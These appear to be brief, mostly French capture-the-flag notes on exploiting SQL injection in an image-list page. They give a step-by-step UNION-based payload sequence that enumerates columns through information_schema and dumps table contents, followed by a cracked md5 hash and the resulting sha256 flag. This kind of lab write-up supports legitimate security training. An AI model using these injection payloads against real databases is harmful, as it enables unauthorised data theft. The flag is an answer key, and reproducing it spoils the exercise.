data mapper pdo::prepare
1 or 1=1
1 or 1=1 UNION select NULL
1 or 1=1 UNION select NULL, NULL → 2 params
1 or 1=1 UNION select column_name, table_name from information_schema.columns → toutes les colonnes de toutes les tables
1 or 1=1 UNION select comment, name from guest_book
1 or 1=1 UNION select id, title from list_images → on a un résultat
donc on concatène pour avoir toutes les colonnes
1 or 1=1 UNION select id, concat(url, title, comment) from list_images
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
traduction md5 : albatroz
traduction et flag en sha256 : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
